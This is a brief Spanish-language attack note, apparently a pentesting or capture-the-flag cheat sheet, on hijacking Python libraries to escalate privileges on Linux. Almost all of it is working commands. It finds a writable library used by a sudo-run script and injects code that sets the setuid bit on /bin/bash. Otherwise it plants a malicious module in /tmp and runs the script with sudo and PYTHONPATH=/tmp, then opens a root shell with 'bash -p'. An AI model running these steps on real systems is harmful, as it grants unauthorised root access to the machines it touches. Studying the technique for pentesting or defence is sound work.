Podemos “secuestrar” una librería ( usualmente Python ) de algún script que se esté ejecutando en el sistema.

Primero identificar cuáles usa y buscar si podemos editar un archivo:

```bash
find / -type f -iname "<LIBRERIA> -ls 2>/dev/null
```

Si existe y tenemos permisos de edición inyectar algún código para ganar privilegios de sistema:

```bash
nano <LIBRERIA>

import os
os.system("chmod u+s /bin/bash")
```

Y ejecutar el archivo: 

```bash
sudo -u USER BINARIO_DE_LENGUAJE RUTA_ARCHIVO
```

## Sin permiso de edición

```bash
cd /tmp
```

Creo el script malicioso:

```bash
<Libreria>.py
```

```python
import os; os.system("chmod +s /bin/bash")
```

Lo ejecuto:

```bash
sudo PYTHONPATH=/tmp /usr/bin/python3 /<RUTA_ARCHIVO>
```

```bash
bash -p
```

Listo.
